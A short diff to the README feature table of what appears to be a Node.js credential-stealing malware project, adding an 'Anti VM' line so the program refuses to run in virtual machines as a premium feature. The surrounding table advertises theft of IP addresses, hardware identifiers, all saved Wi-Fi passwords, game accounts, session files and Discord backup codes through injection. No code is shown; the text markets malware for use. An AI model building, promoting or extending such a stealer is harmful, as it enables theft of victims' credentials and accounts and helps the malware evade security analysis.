@@ -65,6 +65,7 @@ node index.js
 | `Ip Address (Public/Local)`                | Takes IP address (public)/Takes IP address (Local)           | ✅        |
 | `Info PC (UUID/MAC/CPU/GPU) & PC Windows Product`                | Takes RAM PC (KB)/Takes UUID PC/Takes Windows MAC address PC/Takes CPU Model PC...           | ✅        |
 | `PC Wifi Passwords`                | Takes ALL Wifi passwords (Only works on laptop)           | ✅        |
+| `Anti VM`                | It will not run in a Virtual Machine (premium)           | ✅        |
 | `Stealer Game(s)`                | Steal EpicGame/Minecraft/Roblox and more...           | 💜        |
 | `Stealer File(s)`                | Steal Files Session & URL(s)           | 💜        |
 | `Discord Backup Codes (Injection)`                | It takes them on the first execution and when it does it again           | 💜        |
